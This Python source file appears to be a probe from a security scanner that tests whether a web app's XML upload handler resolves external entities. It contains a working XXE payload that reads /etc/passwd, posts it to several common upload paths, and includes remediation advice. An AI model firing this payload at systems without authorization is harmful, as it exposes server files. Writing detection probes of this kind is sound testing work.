#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
XML External Entity (XXE) injection: file-upload handler resolves
external-entity references against the local filesystem.

Apps that parse uploaded XML with a default-configured parser
(`libxml2`, `Saxon`, the JDK XML stack at default settings) accept
DOCTYPE declarations including external entities. A malicious upload
declares `<!ENTITY x SYSTEM "file:///etc/passwd">` and references it
in the body — the parser resolves the entity by reading the file,
inlining the contents into the parsed document, often echoed back to
the client in an error message or rendered field.

This probe uses the data-access (`file:///`) form ONLY — billion-
laughs and SSRF chains are explicitly out of scope (the former is a
DoS, the latter is a separate finding class). We submit one upload and
look for `root:x:0:0` in the response. That string is the canonical
first line of /etc/passwd; it does not appear in arbitrary HTML, so
its presence is unambiguous proof the parser inlined the file.

Detection signal:
  POST /file-upload (multipart) with an .xml file declaring an external
  entity → response or its error body contains `root:x:0:0`.

Tested against:
  + OWASP Juice Shop  current build patched the XML parser; probe
                      correctly returns validated=False (catalog only).
  + nginx default site → validated=False
  + Would fire on any app whose XML parser still resolves external
    entities at parse time.
"""
from __future__ import annotations

import re
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Endpoints that commonly accept file uploads.
UPLOAD_PATHS = (
    "/file-upload",            # Juice Shop's literal path
    "/upload",
    "/api/upload",
    "/api/file/upload",
    "/api/files",
    "/files/upload",
)

# The XML payload — a DOCTYPE block declaring a SYSTEM entity that the
# parser will resolve by reading the named file. The `<root>` element
# references the entity so its contents land in a parsed-out node a
# downstream renderer is likely to echo back. file:///etc/passwd is
# the canonical XXE smoke test on Linux; we keep it to a single
# entity reference (no recursive expansion = no DoS risk).
_XML_PAYLOAD = (
    b'<?xml version="1.0" encoding="UTF-8"?>\n'
    b'<!DOCTYPE root [\n'
    b'  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
    b']>\n'
    b'<root><probe>&xxe;</probe></root>\n'
)

# Marker that proves the file was actually inlined. /etc/passwd's first
# line is `root:x:0:0:...`; nothing in normal HTML/JSON looks like it.
_PASSWD_RE = re.compile(r"\broot:x:0:0:")


def _build_multipart(filename: str, content: bytes,
                     field: str = "file") -> tuple[str, bytes]:
    """Hand-roll a minimal multipart/form-data body. Returns (boundary,
    body bytes). We don't pull in `requests` for one upload."""
    boundary = "----dast-xxe-" + secrets.token_hex(8)
    crlf = b"\r\n"
    parts = []
    parts.append(("--" + boundary).encode())
    parts.append(
        f'Content-Disposition: form-data; name="{field}"; '
        f'filename="{filename}"'.encode())
    parts.append(b"Content-Type: application/xml")
    parts.append(b"")
    parts.append(content)
    parts.append(("--" + boundary + "--").encode())
    parts.append(b"")
    body = crlf.join(parts)
    return boundary, body


class XxeFileUploadProbe(Probe):
    name = "xxe_file_upload"
    summary = ("Detects XXE in upload handlers that parse .xml content "
               "with external-entity resolution enabled.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--upload-path", action="append", default=[],
            help="Additional upload endpoint to try (repeatable).")
        parser.add_argument(
            "--field", default="file",
            help="Multipart field name carrying the file (default: file).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(UPLOAD_PATHS) + list(args.upload_path or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        for p in paths:
            url = urljoin(origin, p)
            boundary, body = _build_multipart(
                f"probe-{secrets.token_hex(4)}.xml",
                _XML_PAYLOAD, field=args.field)
            r = client.request("POST", url, headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }, body=body)
            row: dict = {"path": p, "status": r.status, "size": r.size}
            if r.body and _PASSWD_RE.search(r.text):
                row["xxe_succeeded"] = True
                # Capture a short window around the match for the
                # finding's evidence row — useful for human review,
                # but capped so we don't persist the whole passwd file.
                m = _PASSWD_RE.search(r.text)
                if m:
                    s, e = max(0, m.start() - 50), min(len(r.text),
                                                       m.end() + 200)
                    row["snippet"] = r.text[s:e]
                confirmed = row
                attempts.append(row)
                break
            attempts.append(row)

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: XXE in upload handler at "
                         f"{origin}{confirmed['path']} — the response "
                         "contains the inlined contents of /etc/passwd."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Disable external-entity resolution in the XML "
                    "parser. Per-language defaults that close XXE:\n"
                    "  - Java/JAXP: factory.setFeature("
                    "XMLConstants.FEATURE_SECURE_PROCESSING, true) and "
                    "set `disallow-doctype-decl` to true.\n"
                    "  - Python lxml: etree.XMLParser(resolve_entities=False, "
                    "no_network=True).\n"
                    "  - libxml2: pass XML_PARSE_NOENT off and "
                    "XML_PARSE_NONET on.\n"
                    "  - .NET: XmlReaderSettings.DtdProcessing = "
                    "DtdProcessing.Prohibit.\n"
                    "Better still — refuse XML uploads entirely if the "
                    "feature only needs JSON or images."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: {len(attempts)} XXE upload attempts on "
                     f"{origin}; no response inlined /etc/passwd."),
            evidence=evidence,
        )


if __name__ == "__main__":
    XxeFileUploadProbe().main()
